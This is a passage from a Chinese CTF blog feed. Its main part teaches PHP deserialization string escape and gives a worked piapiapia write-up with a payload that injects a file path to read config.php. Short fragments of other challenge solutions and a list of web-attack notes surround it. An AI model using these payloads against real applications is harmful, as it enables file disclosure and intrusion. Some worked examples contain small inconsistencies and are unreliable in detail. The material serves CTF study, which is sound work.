class="hljs-built_in">print</span>(result)<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">if</span> attempt_count % <span class="hljs-number">10</span> == <span class="hljs-number">0</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;尝试次数：<span class="hljs-subst">&#123;attempt_count&#125;</span>, 最近返回内容（前100字符）：<span class="hljs-subst">&#123;result[:<span class="hljs-number">100</span>]&#125;</span>&quot;</span>)<br>        time.sleep(<span class="hljs-number">0.1</span>)<br></code></pre></td></tr></table></figure><h1 id="re"><a href="#re" class="headerlink" title="re"></a>re</h1><h2 id="Compress-dot-new"><a href="#Compress-dot-new" class="headerlink" title="Compress dot new"></a><strong>Compress dot new</strong></h2><p>ds直接嗖了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> json<br><br><span class="hljs-comment"># 读取enc.txt文件</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;enc.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    content = f.read().split(<span class="hljs-string">&#x27;\n&#x27;</span>, <span class="hljs-number">1</span>)<br>    json_tree = content[<span class="hljs-number">0</span>]<br>    encoded_bits = content[<span class="hljs-number">1</span>].strip()<br><br><span class="hljs-comment"># 解析JSON树结构</span><br>huffman_tree = json.loads(json_tree)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decode_huffman</span>(<span class="hljs-params">tree, bit_str</span>):<br>    result = []<br>    current_node = tree<br>    <span class="hljs-keyword">for</span> bit <span class="hljs-keyword">in</span> bit_str:<br>        <span class="hljs-keyword">if</span> bit == <span class="hljs-string">&#x27;0&#x27;</span>:<br>            current_node = current_node[<span class="hljs-string">&#x27;a&#x27;</span>]<br>        <span class="hljs-keyword">else</span>:<br>            current_node = current_node[<span class="hljs-string">&#x27;b&#x27;</span>]<br><br>        <span class="hljs-comment"># 检查是否为叶子节点</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;s&#x27;</span> <span class="hljs-keyword">in</span> current_node:<br>            char_code = current_node[<span class="hljs-string">&#x27;s&#x27;</span>]<br>            result.append(char_code)<br>            current_node = tree  <span class="hljs-comment"># 重置到根节点</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(result)<br><br><br><span class="hljs-comment"># 解码并输出结果</span><br>decoded_bytes = decode_huffman(huffman_tree, encoded_bits)<br><span class="hljs-built_in">print</span>(decoded_bytes.decode(<span class="hljs-string">&#x27;latin-1&#x27;</span>))<br></code></pre></td></tr></table></figure><p><strong>flag: hgame{Nu-Shell-scr1pts-ar3-1nt3r3st1ng-t0-wr1te-&amp;-use!}</strong></p>]]></content>
    
    
    <categories>
      
      <category>每日一web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>xss</tag>
      
      <tag>比赛</tag>
      
      <tag>条件竞争</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>反序列化之字符串逃逸</title>
    <link href="/2025/02/05/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/"/>
    <url>/2025/02/05/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/</url>
    
    <content type="html"><![CDATA[<h2 id="常见的字符串逃逸"><a href="#常见的字符串逃逸" class="headerlink" title="常见的字符串逃逸"></a>常见的字符串逃逸</h2><h4 id="基本知识"><a href="#基本知识" class="headerlink" title="基本知识"></a>基本知识</h4><p>1.<strong>序列化字符串必须使用单引号 <code>&#39;</code>  包裹</strong>。PHP 的序列化格式要求字符串部分使用双引号，否则会导致 <code>unserialize()</code> 报错。</p><p>2.再有特定的针对序列化后的字符串变长变短的情况下</p><ul><li>在php中，反序列化的过程中必须严格按照序列化规则才能成功实现反序列化，例如</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-variable">$str</span> = <span class="hljs-string">&#x27;a:2:&#123;i:0;s:4:&quot;flag&quot;;i:1;s:6:&quot;mikasa&quot;;&#125;&#x27;</span>;<br>  <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$str</span>));<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">#输出结果</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">array(2)&#123;</span><br><span class="hljs-comment">[0]=&gt; string(4) &quot;flag&quot;</span><br><span class="hljs-comment">  [1]=&gt; string(6) &quot;mikasa&quot;</span><br><span class="hljs-comment">&#125;</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><ul><li>一般情况下，按照我们的正常理解，上面例子中变量<code>$str</code>是一个标准的序列化后的字符串，按理来说改变其中任何一个字符都会导致反序列化失败。但事实并非如此。如果在<code>$str</code>结尾的花括号后加一些字符</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-variable">$str</span> = <span class="hljs-string">&#x27;a:2:&#123;i:0;s:4:&quot;flag&quot;;i:1;s:6:&quot;mikasa&quot;;&#125;abc&#x27;</span>;<br>  <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$str</span>));<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">#输出结果依然和上面的相同</span><br></code></pre></td></tr></table></figure><ul><li>这说明了反序列化的过程是有一定识别范围的，在这个范围之外的字符（如花括号外的abc）都会被忽略，不影响反序列化的正常进行、</li></ul><hr><h4 id="php-反序列化-的几大特性"><a href="#php-反序列化-的几大特性" class="headerlink" title="php[反序列化]的几大特性"></a>php[反序列化]的几大特性</h4><ul><li>PHP 在反序列化时，是以 <code>;</code> 作为字段的分隔，以 <code>&#125;</code> 作为结尾（字符串除外）并且是根据长度判断内容的<ul><li>注意点: 很容易以为序列化后的字符串是<code>&#125;</code>结尾，实际上序列化字符串是以<code>;&#125;</code>结尾的，但对象序列化是直接<code>&#125;</code>结尾</li><li>php反序列化字符逃逸，就是通过这个结尾符实现的</li></ul></li><li>当长度不对应的时候会出现报错</li></ul><hr><h4 id="反序列化字符逃逸"><a href="#反序列化字符逃逸" class="headerlink" title="反序列化字符逃逸"></a>反序列化字符逃逸</h4><p>反序列化之所以存在字符串逃逸，最主要的原因是代码中存在针对序列化（serialize()）后的字符串进行了过滤操作（变多或者变少）。</p><p>反序列化字符逃逸问题根据过滤函数一般分为两种，字符数增多和字符数减少</p><h5 id="字符数增多"><a href="#字符数增多" class="headerlink" title="字符数增多"></a>字符数增多</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;yy&#x27;</span>,<span class="hljs-variable">$str</span>);<br>&#125;<br><br><span class="hljs-variable">$username</span> = <span class="hljs-string">&quot;admin&quot;</span>;<br><span class="hljs-variable">$password</span> = <span class="hljs-string">&quot;123456&quot;</span>;<br><span class="hljs-variable">$user</span> = <span class="hljs-keyword">array</span>(<span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span>);<br><br><span class="hljs-variable">$str1</span> = <span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$user</span>));<br><span class="hljs-comment">//$str2 = filter($_GET[&#x27;user&#x27;]);</span><br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$str1</span>));<br><span class="hljs-comment">//var_dump(unserialize($str2));</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>问：如果我能控制进行反序列化的字符串，该如何使var_dump打印出来的password对应的值是<code>654321</code>，而不是<code>123456</code>？</p><ul><li>正常情况下反序列化字符串**$str1**的值为<code>a:2:&#123;i:0;s:5:&quot;admin&quot;;i:1;s:6:&quot;123456&quot;;&#125;</code></li><li>那么把username的值变为<code>adminxxx</code>，当完成序列化，filter函数处理后的结果为<code>a:2:&#123;i:0;s:8:&quot;adminyyyyyy&quot;;i:1;s:6:&quot;123456&quot;;&#125;</code><ul><li>因为比之前多了三个字符，反序列化时肯定是会失败的！</li><li>所以，可以利用多出来的字符串做一些坏事？</li></ul></li><li>想要password是<code>654321</code>，反序列化化前的字符串要是 <code>a:2:&#123;i:0;s:5:&quot;admin&quot;;i:1;s:6:&quot;654321&quot;;&#125;</code></li><li>如果说最后的是<ul><li><code>a:2:&#123;i:0;s:25:&quot;admin&quot;;i:1;s:6:&quot;654321&quot;;&#125;&quot;;i:1;s:6:&quot;123456&quot;;&#125;</code>那么密码就会变成654321，<code>;&#125;</code>会被忽略</li><li>要构建的字段是 <code>&quot;;i:1;s:6:&quot;654321&quot;;&#125;</code> 数一下是20个字符，</li><li>一个x会导致多出一个字符，所以加上20个x，<code>&quot;;i:1;s:6:&quot;123456&quot;;&#125;</code>部分的内容会被当作无效部分被忽略</li></ul></li><li>所以最终输入是<ul><li><code>a:2:&#123;i:0;s:45:&quot;adminxxxxxxxxxxxxxxxxxxxx&quot;;i:1;s:6:&quot;654321&quot;;&#125;&quot;;i:1;s:6:&quot;123456&quot;;&#125;</code></li><li>filter之后，会变为</li><li><code>a:2:&#123;i:0;s:45:&quot;adminyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy&quot;;i:1;s:6:&quot;654321&quot;;&#125;&quot;;i:1;s:6:&quot;123456&quot;;&#125;</code></li></ul></li></ul><h5 id="字符串减少"><a href="#字符串减少" class="headerlink" title="字符串减少"></a>字符串减少</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;xx&quot;</span>,<span class="hljs-string">&quot;y&quot;</span>,<span class="hljs-variable">$str</span>);<br>&#125;<br><br><span class="hljs-variable">$username</span> = <span class="hljs-string">&quot;admin&quot;</span>;<br><span class="hljs-variable">$password</span> = <span class="hljs-string">&quot;123456&quot;</span>;<br><span class="hljs-variable">$user</span> = <span class="hljs-keyword">array</span>(<span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span>);<br><br><span class="hljs-variable">$str1</span> = <span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$user</span>));<br><span class="hljs-comment">//$str2 = filter(serialize($_GET[&#x27;user&#x27;]));</span><br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$str1</span>));<br><span class="hljs-comment">//var_dump(unserialize($str2));</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>问：如果我能控制进行反序列化的字符串，该如何使var_dump打印出来的password对应的值是<code>654321</code>，而不是<code>123456</code>？</p><ul><li>正常情况下反序列化字符串**$str1**的值为 <code>a:2:&#123;i:0;s:5:&quot;admin&quot;;i:1;s:6:&quot;654321&quot;;&#125;</code></li><li>那么把username的值变为<code>adminxxxxxx</code>，当完成序列化，filter函数处理后的结果为<code>a:2:&#123;i:0;s:11:&quot;adminyyy&quot;;i:1;s:6:&quot;123456&quot;;&#125;</code><ul><li>因为比之前少了三个字符，反序列化时肯定是会失败的,<code>amdinyyy</code>的长度为8，还会继续往后吞3个字符！但这样会造成语法错误！</li><li>所以，是否可以利用变化的字符长度做一些坏事？（吞掉原有的password值，再添加新值！）</li></ul></li><li>构建的注入表达式是<strong>后面部分需要可控</strong><ul><li><code>a:2:&#123;i:0;s:5:&quot;admin&quot;;i:1;s:6:&quot;123456&quot;;&#125;&quot;;i:1;s:6:&quot;654321&quot;;&#125;</code></li><li>所以要吞掉的内容是<code>&quot;;i:1;s:6:&quot;123456&quot;;&#125;</code> 一共是20个字符！所以需要添加40个x</li></ul></li><li>所以最终的输入时<ul><li><code>a:2:&#123;i:0;s:45:&quot;adminxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;;i:1;s:6:&quot;123456&quot;;&#125;&quot;;i:1;s:6:&quot;654321&quot;;&#125;</code></li><li>filter之后，会变为</li><li><code>a:2:&#123;i:0;s:45:&quot;mikasayyyyyyyyyyyyyyyyyyyy&quot;;i:1;s:6:&quot;123456&quot;;&#125;&quot;;i:1;s:6:&quot;654321&quot;;&#125;</code></li></ul></li></ul><h4 id="4、总结"><a href="#4、总结" class="headerlink" title="4、总结"></a>4、总结</h4><ul><li>当字符增多：在输入的时候再加上精心构造的字符。经过过滤函数，字符变多之后，就把我们构造的给挤出来。从而实现字符逃逸</li><li>当字符减少：在输入的时候再加上精心构造的字符。经过过滤函数，字符减少后，会把原有的吞掉，使构造的字符实现代替</li></ul><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>[0CTF 2016]piapiapia</p><p>先常规操作:看源码，查看robots.txt，disearch扫描，抓包</p><p>sql没有反应，disearch发现<a href="http://www.zip源码泄露/">www.zip源码泄露</a></p><p>查看源码，发现flag在config.php文件里面，那么就需要文件包含</p><p>在profile.php内里有函数file_get_content()函数，我们要构建参数为config.php</p><p>读源码发现注册后上传的用户资料会被序列化然后对序列化后的代码进行过滤</p><p>但是过滤后发生替换直接存储，然后直接调用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>) </span>&#123;<br><span class="hljs-variable">$escape</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;\\\\&#x27;</span>);<br><span class="hljs-variable">$escape</span> = <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;|&#x27;</span>, <span class="hljs-variable">$escape</span>) . <span class="hljs-string">&#x27;/&#x27;</span>;<br><span class="hljs-variable">$string</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$escape</span>, <span class="hljs-string">&#x27;_&#x27;</span>, <span class="hljs-variable">$string</span>);<br><br><span class="hljs-variable">$safe</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;select&#x27;</span>, <span class="hljs-string">&#x27;insert&#x27;</span>, <span class="hljs-string">&#x27;update&#x27;</span>, <span class="hljs-string">&#x27;delete&#x27;</span>, <span class="hljs-string">&#x27;where&#x27;</span>);<br><span class="hljs-variable">$safe</span> = <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;|&#x27;</span>, <span class="hljs-variable">$safe</span>) . <span class="hljs-string">&#x27;/i&#x27;</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$safe</span>, <span class="hljs-string">&#x27;hacker&#x27;</span>, <span class="hljs-variable">$string</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>发现where被替换后存在字符串逃逸漏洞（变长）</p><p>那么就可以把photo的文件名换成config,php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;phone&#x27;</span>] = <span class="hljs-string">&#x27;12345678901&#x27;</span>;<br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;email&#x27;</span>] = <span class="hljs-string">&#x27;123@321.com&#x27;</span>;<br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>]=<span class="hljs-string">&#x27;name&#x27;</span>;<br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;photo&#x27;</span>] = <span class="hljs-string">&#x27;wokao&#x27;</span>;<br><br><br><span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$profile</span>);<br><br></code></pre></td></tr></table></figure><p>我们要替换成</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">&quot;;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;photo&quot;</span>;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;config.php&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>长度33个那就要33个where</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>]=<span class="hljs-string">&#x27;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;&#x27;</span>;<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;phone&#x27;</span>] = <span class="hljs-string">&#x27;12345678901&#x27;</span>;<br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;email&#x27;</span>] = <span class="hljs-string">&#x27;123@321.com&#x27;</span>;<br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>]=<span class="hljs-string">&#x27;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;&#x27;</span>;<br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;photo&#x27;</span>] = <span class="hljs-string">&#x27;wokao&#x27;</span>;<br><br><br><span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$profile</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-variable">$b</span>=<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br><br><span class="hljs-variable">$b</span>=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$b</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$b</span>);<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>) </span>&#123;<br>    <span class="hljs-variable">$safe</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;select&#x27;</span>, <span class="hljs-string">&#x27;insert&#x27;</span>, <span class="hljs-string">&#x27;update&#x27;</span>, <span class="hljs-string">&#x27;delete&#x27;</span>, <span class="hljs-string">&#x27;where&#x27;</span>);<br>    <span class="hljs-variable">$safe</span> = <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;|&#x27;</span>, <span class="hljs-variable">$safe</span>) . <span class="hljs-string">&#x27;/i&#x27;</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$safe</span>, <span class="hljs-string">&#x27;hacker&#x27;</span>, <span class="hljs-variable">$string</span>);<br>&#125;<br>结果：<br>a:<span class="hljs-number">4</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;phone&quot;</span>;s:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;12345678901&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;email&quot;</span>;s:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;123@321.com&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;nickname&quot;</span>;s:<span class="hljs-number">198</span>:<span class="hljs-string">&quot;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;photo&quot;</span>;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;config.php&quot;</span>;&#125;<span class="hljs-string">&quot;;s:5:&quot;</span>photo<span class="hljs-string">&quot;;s:5:&quot;</span>wokao<span class="hljs-string">&quot;;&#125;</span><br><span class="hljs-string">a:4:&#123;s:5:&quot;</span>phone<span class="hljs-string">&quot;;s:11:&quot;</span><span class="hljs-number">12345678901</span><span class="hljs-string">&quot;;s:5:&quot;</span>email<span class="hljs-string">&quot;;s:11:&quot;</span><span class="hljs-number">123</span>@<span class="hljs-number">321</span>.com<span class="hljs-string">&quot;;s:8:&quot;</span>nickname<span class="hljs-string">&quot;;s:198:&quot;</span>hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker<span class="hljs-string">&quot;;s:5:&quot;</span>photo<span class="hljs-string">&quot;;s:10:&quot;</span>config.php<span class="hljs-string">&quot;;&#125;&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;photo&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;wokao&quot;</span>;&#125;<br><span class="hljs-keyword">array</span>(<span class="hljs-number">4</span>) &#123;<br>  [<span class="hljs-string">&quot;phone&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">11</span>) <span class="hljs-string">&quot;12345678901&quot;</span><br>  [<span class="hljs-string">&quot;email&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">11</span>) <span class="hljs-string">&quot;123@321.com&quot;</span><br>  [<span class="hljs-string">&quot;nickname&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">198</span>) <span class="hljs-string">&quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;</span><br>  [<span class="hljs-string">&quot;photo&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">10</span>) <span class="hljs-string">&quot;config.php&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>但是nick那么的长度要小于10,采用数组绕过</p><p>在<code>;</code>后面加上<code>&#125;</code>闭合数组，where也要加一个</p><p>最终</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;phone&#x27;</span>] = <span class="hljs-string">&#x27;12345678901&#x27;</span>;<br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;email&#x27;</span>] = <span class="hljs-string">&#x27;123@321.com&#x27;</span>;<br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>]=<span class="hljs-string">&#x27;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;&#x27;</span>;<br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;photo&#x27;</span>] = <span class="hljs-string">&#x27;wokao&#x27;</span>;<br><br><br><span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$profile</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br></code></pre></td></tr></table></figure><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250205181546710.png" alt="image-20250205181546710"></p><p>上传后拿到图片( 记得抓包</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250205181638367.png" alt="image-20250205181638367"></p><p>解码拿到flag</p>]]></content>
    
    
    <categories>
      
      <category>知识点</category>
      
    </categories>
    
    
    <tags>
      
      <tag>字符串逃逸</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>笔记清单</title>
    <link href="/2025/02/05/%E7%AC%94%E8%AE%B0%E6%B8%85%E5%8D%95/"/>
    <url>/2025/02/05/%E7%AC%94%E8%AE%B0%E6%B8%85%E5%8D%95/</url>
    
    <content type="html"><![CDATA[<p>部分未及时更新</p><ul><li><input disabled="" type="checkbox"> <a href="https://258369123.github.io/2025/01/26/xss%E6%8C%87%E5%8C%97/">xss指北</a></li><li><input disabled="" type="checkbox"> <a href="https://258369123.github.io/2025/01/26/xxe%E6%8C%87%E5%8C%97/">xxe指北</a></li><li><input disabled="" type="checkbox"> <a href="https://258369123.github.io/2025/01/26/Xpath%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/">Xpath注入指北</a></li><li><input checked="" disabled="" type="checkbox"> <a href="https://258369123.github.io/2025/01/19/Djingo_ssti/">Djingo_ssti</a></li><li><input checked="" disabled="" type="checkbox"> <a href="https://258369123.github.io/2025/01/26/pker/">pker</a></li><li><input checked="" disabled="" type="checkbox"> <a href="https://258369123.github.io/2025/01/25/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">pickle反序列化</a></li><li><input checked="" disabled="" type="checkbox"> <a 